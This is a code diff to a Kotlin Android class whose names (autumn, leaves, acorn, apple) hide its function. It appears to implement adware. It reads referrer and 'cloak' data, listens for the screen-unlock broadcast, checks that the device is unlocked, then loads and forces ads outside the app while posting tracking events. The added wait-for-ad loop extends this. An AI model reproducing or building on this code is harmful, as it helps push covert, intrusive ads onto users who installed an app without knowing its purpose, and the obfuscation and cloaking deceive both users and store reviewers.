@@ -9,6 +9,7 @@ import android.os.PowerManager
 import com.autumn.leaves.broad.AutoReceiver
 import com.autumn.leaves.flows.AcornBroadcast
 import com.autumn.leaves.flows.CrispFlows
+import com.autumn.leaves.ss.ListenerShowEvent
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
@@ -23,8 +24,8 @@ import java.util.Locale
  * Describe:
  */
 
-class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
-    private var mAutumnL by AppleCache(nameP = "autumn_length")
+class CozyApple(val context: Context, private val leaversCache: LeaversCache) : ListenerShowEvent {
+    private var mAutumnL by AppleCache(nameP = "autumn_length", defApple = "1")
 
     private var scopeMain: CoroutineScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
 
@@ -98,7 +99,7 @@ class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
         }
 
         if (CrispFlows.autumnUser()) {
-            postUseE("adjust")
+            postUseE("adjust1")
             return
         }
         if (CrispFlows.mNetworkStr.isNotBlank() && WindHelper.mReferrer.isNotBlank() && WindHelper.mCloakInfo.isNotBlank()) {
@@ -143,37 +144,21 @@ class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
                 delay(500)
             }
             CrispFlows.crispEvent(context, "hwsod")
-            context.registerReceiver(AcornBroadcast(), IntentFilter().apply {
+            context.registerReceiver(AcornBroadcast {
+                if (mAutumnL.length < 100) {
+                    WindHelper.eventPost("time_charge")
+                    action(true)
+                }
+            }, IntentFilter().apply {
                 addAction(Intent.ACTION_USER_PRESENT)
             })
 
-            launch {
-                CrispFlows.globalFlow.collect {
-                    WindHelper.log("log--->$it")
-                    when (it) {
-                        "broadcast" -> {
-                            if (mAutumnL.length < 100) {
-                                WindHelper.eventPost("time_charge")
-                                action(true)
-                            }
-                        }
 
-                        "star_up" -> {
-                            WindHelper.eventPost("startup")
-                            mAutumnL = ""
-                        }
-
-                        "adLoadSuccess" -> action(false)
-                        "adNotReady" -> {
-                            lastShowSuccessTime = 0
-                        }
-                    }
-                }
-            }
-
+            leaversCache.mListenerShowEvent = this@CozyApple
             WindHelper.setEventNumToMax()
+            leaversCache.isStopRequestCircle = true
             while (mTimerRequest) {
-                CrispFlows.globalFlow.emit("load_leavers")
+                leaversCache.loadTrad()
                 WindHelper.eventPost("time")
                 action(false)
                 WindHelper.timeCheckDelay()
@@ -182,6 +167,9 @@ class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
     }
 
     private var lastShowSuccessTime = 0L
+
+    private var waitShow = false
+    private var cheJob: Job? = null
 
     private fun action(isBro: Boolean) {
         WindHelper.log("action--->$mAutumnL")
@@ -193,25 +181,43 @@ class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
         if (isDeviceLockInfo(context).not()) return
         WindHelper.eventPost("isunlock")
 
-        if (isWaitInstallSuccess.not()) return
+        if (isWaitInstallSuccess.not() && WindHelper.isFlowWaitFinish().not()) {
+            return
+        }
         if (WindHelper.windStatus.contains("a_s_pp", true)) return
         if (isBro.not() && System.currentTimeMillis() - lastShowSuccessTime < WindHelper.timeShowPAutumn) return
 
         WindHelper.eventPost("ispass")
 
-        scopeMain.launch(Dispatchers.Main) {
-            lastShowSuccessTime = System.currentTimeMillis()
-            if (leaversCache.isCanUse() != null) {
+        if (leaversCache.isCanUse() != null) {
+            scopeMain.launch(Dispatchers.Main) {
+                cheJob?.cancel()
+                lastShowSuccessTime = System.currentTimeMillis()
                 WindHelper.eventPost("isready")
-                CrispFlows.globalFlow.emit("finishAndShow")
                 if (leaversCache.finishActivity() > 0) {
                     delay(201)
                 }
                 withContext(Dispatchers.IO) {
+                    mAutumnL += ('a'..'m').random()
                     CrispFlows.crispEvent(context, "lolvns")
                 }
-            } else {
+            }
+        } else {
+            cheJob?.cancel()
+            cheJob = scopeMain.launch(Dispatchers.Main) {
+                waitShow = true
                 leaversCache.loadAndTry()
+                val max = (WindHelper.getTimeCheckTime() / 1000) - 2
+                var num = 0
+                while (num < max && waitShow) {
+                    delay(1000)
+                    WindHelper.log("wait ad ---->")
+                    if (leaversCache.isCanUse() != null && waitShow) {
+                        loadedSuccess()
+                        break
+                    }
+                    num++
+                }
             }
         }
     }
@@ -221,6 +227,23 @@ class CozyApple(val context: Context, private val leaversCache: LeaversCache) {
         return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
             Context.KEYGUARD_SERVICE
         ) as KeyguardManager).isDeviceLocked.not()
+    }
+
+    override fun showStart() {
+        mAutumnL = ""
+    }
+
+    override fun showFailed() {
+        lastShowSuccessTime = 0
+    }
+
+    override fun loadedSuccess() {
+        WindHelper.log("loadedSuccess--->$waitShow")
+        if (waitShow) {
+            waitShow = false
+            cheJob?.cancel()
+            action(false)
+        }
     }
 
 
